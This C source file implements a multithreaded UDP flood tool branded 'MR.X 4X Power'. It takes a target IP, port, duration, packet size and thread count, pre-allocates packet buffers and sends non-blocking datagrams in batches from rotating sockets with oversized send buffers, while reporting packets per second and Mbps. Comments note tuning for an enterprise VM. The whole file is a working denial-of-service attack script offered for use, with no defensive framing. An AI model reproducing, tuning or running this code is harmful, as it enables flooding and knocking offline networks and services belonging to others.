#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <fcntl.h>
#include <sys/mman.h>

#define BUFFER_ROTATION 8
#define PRE_ALLOC_COUNT 200000  // 300000 से घटाकर 200000 (Enterprise VM के लिए)
#define BATCH_SIZE 256          // 512 से घटाकर 256 (कम मेमोरी)
#define UPDATE_INTERVAL 1000    // 500 से बढ़ाकर 1000 (कम sync)

char *TARGET_IP;
int TARGET_PORT;
int DURATION_TIME;
int PACKET_SIZE;
int THREAD_COUNT;

volatile unsigned long long total_packets = 0;
volatile unsigned long long total_bytes = 0;
pthread_t monitor_thread;
int monitor_running = 1;

char **packet_pool = NULL;

void print_k_format(unsigned long long value, char *buffer) {
    if (value < 1000) sprintf(buffer, "%llu", value);
    else if (value < 1000000) sprintf(buffer, "%.1fK", value/1000.0);
    else sprintf(buffer, "%.1fM", value/1000000.0);
}

void init_packet_pool() {
    packet_pool = malloc(PRE_ALLOC_COUNT * sizeof(char*));
    if (!packet_pool) {
        fprintf(stderr, "Memory allocation failed for packet pool\n");
        exit(EXIT_FAILURE);
    }
    
    for(int i = 0; i < PRE_ALLOC_COUNT; i++) {
        packet_pool[i] = malloc(PACKET_SIZE);
        if (!packet_pool[i]) {
            fprintf(stderr, "Memory allocation failed for packet %d\n", i);
            exit(EXIT_FAILURE);
        }
        // Fast pattern generation
        for(int j = 0; j < PACKET_SIZE; j++) {
            packet_pool[i][j] = (i + j * 13) % 256;
        }
        // Memory lock only if size is reasonable
        if (PACKET_SIZE <= 256) {
            mlock(packet_pool[i], PACKET_SIZE);
        }
    }
}

void cleanup_pool() {
    for(int i = 0; i < PRE_ALLOC_COUNT; i++) {
        if(packet_pool[i]) {
            if (PACKET_SIZE <= 256) {
                munlock(packet_pool[i], PACKET_SIZE);
            }
            free(packet_pool[i]);
        }
    }
    free(packet_pool);
}

void *pps_monitor(void *arg) {
    unsigned long long prev_count = 0;
    unsigned long long prev_bytes = 0;
    unsigned long long start_time = time(NULL);
    
    while (monitor_running) {
        sleep(1);
        unsigned long long current_count = total_packets;
        unsigned long long current_bytes = total_bytes;
        unsigned long long elapsed = time(NULL) - start_time;
        
        unsigned long long pps = current_count - prev_count;
        unsigned long long bps = (current_bytes - prev_bytes) * 8;
        double mbps = bps / 1000000.0;
        
        prev_count = current_count;
        prev_bytes = current_bytes;
        
        char total_str[20], pps_str[20];
        print_k_format(current_count, total_str);
        print_k_format(pps, pps_str);
        
        fprintf(stderr, "MR.X 🔥🔥: %s pkts | %s pps | %.1f Mbps | %llus | X | 0 err\n",
                total_str, pps_str, mbps, elapsed);
        fflush(stderr);
    }
    return NULL;
}

void *send_ultra(void *arg) {
    int socks[BUFFER_ROTATION];
    struct sockaddr_in servaddr;
    time_t start_time = time(NULL);
    
    memset(&servaddr, 0, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(TARGET_PORT);
    servaddr.sin_addr.s_addr = inet_addr(TARGET_IP);
    
    for(int s = 0; s < BUFFER_ROTATION; s++) {
        socks[s] = socket(AF_INET, SOCK_DGRAM, 0);
        if (socks[s] < 0) {
            perror("Socket creation failed");
            continue;
        }
        int broadcast = 1;
        long sndbuf = 2000L * 1024L * 1024L;  // 2GB - integer overflow fix
        setsockopt(socks[s], SOL_SOCKET, SO_BROADCAST, &broadcast, sizeof(broadcast));
        setsockopt(socks[s], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
        setsockopt(socks[s], SOL_SOCKET, SO_REUSEADDR, &broadcast, sizeof(broadcast));
        fcntl(socks[s], F_SETFL, O_NONBLOCK);
    }
    
    int thread_id = (int)(long)arg;
    int local_pool_index = thread_id * 3000 % PRE_ALLOC_COUNT;
    unsigned long long local_packets = 0;
    unsigned long long local_bytes = 0;
    int current_sock_index = 0;
    
    while (time(NULL) - start_time < DURATION_TIME) {
        int current_sock = socks[current_sock_index];
        
        for (int batch = 0; batch < BATCH_SIZE; batch++) {
            sendto(current_sock, packet_pool[local_pool_index], PACKET_SIZE,
                   MSG_DONTWAIT, (struct sockaddr *)&servaddr, sizeof(servaddr));
            
            local_packets++;
            local_bytes += PACKET_SIZE;
            local_pool_index = (local_pool_index + 1) % PRE_ALLOC_COUNT;
            
            if (local_packets >= UPDATE_INTERVAL) {
                __sync_fetch_and_add(&total_packets, local_packets);
                __sync_fetch_and_add(&total_bytes, local_bytes);
                local_packets = 0;
                local_bytes = 0;
            }
        }
        
        // Rotate socket occasionally
        if (local_pool_index % 100 == 0) {
            current_sock_index = (current_sock_index + 1) % BUFFER_ROTATION;
        }
    }
    
    if (local_packets > 0) {
        __sync_fetch_and_add(&total_packets, local_packets);
        __sync_fetch_and_add(&total_bytes, local_bytes);
    }
    
    for(int s = 0; s < BUFFER_ROTATION; s++) {
        if (socks[s] >= 0) close(socks[s]);
    }
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 6) {
        fprintf(stderr, "Use: %s [IP] [PORT] [TIME] [SIZE] [THREADS]\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    TARGET_IP = argv[1];
    TARGET_PORT = atoi(argv[2]);
    DURATION_TIME = atoi(argv[3]);
    PACKET_SIZE = atoi(argv[4]);
    THREAD_COUNT = atoi(argv[5]);

    if (TARGET_PORT <= 0 || DURATION_TIME <= 0 || PACKET_SIZE <= 0 || THREAD_COUNT <= 0) {
        fprintf(stderr, "Error: Invalid values\n");
        exit(EXIT_FAILURE);
    }

    printf("MR.X 4X Power Started 🔥🔥🔥\n");
    fflush(stdout);
    
    srand(time(NULL));
    init_packet_pool();

    pthread_create(&monitor_thread, NULL, pps_monitor, NULL);

    pthread_t *threads = malloc(THREAD_COUNT * sizeof(pthread_t));
    if (!threads) {
        fprintf(stderr, "Thread allocation failed\n");
        exit(EXIT_FAILURE);
    }
    
    for (int i = 0; i < THREAD_COUNT; i++) {
        if (pthread_create(&threads[i], NULL, send_ultra, (void*)(long)i) != 0) {
            fprintf(stderr, "Thread creation failed %d\n", i);
        }
    }

    sleep(DURATION_TIME);
    monitor_running = 0;
    
    for (int j = 0; j < THREAD_COUNT; j++) {
        pthread_join(threads[j], NULL);
    }

    pthread_join(monitor_thread, NULL);
    cleanup_pool();
    free(threads);
    
    unsigned long long avg_pps = total_packets / DURATION_TIME;
    double avg_mbps = (total_bytes * 8.0) / (DURATION_TIME * 1000000.0);
    
    char total_str[20], pps_str[20];
    print_k_format(total_packets, total_str);
    print_k_format(avg_pps, pps_str);
    
    fprintf(stderr, "MR.X 🔥🔥: %s pkts | %s pps | %.1f Mbps | %ds | X | 0 err\n",
            total_str, pps_str, avg_mbps, DURATION_TIME);
    
    printf("MR.X Work Completed 🔥🔥🔥\n");
    fflush(stdout);

    return 0;
}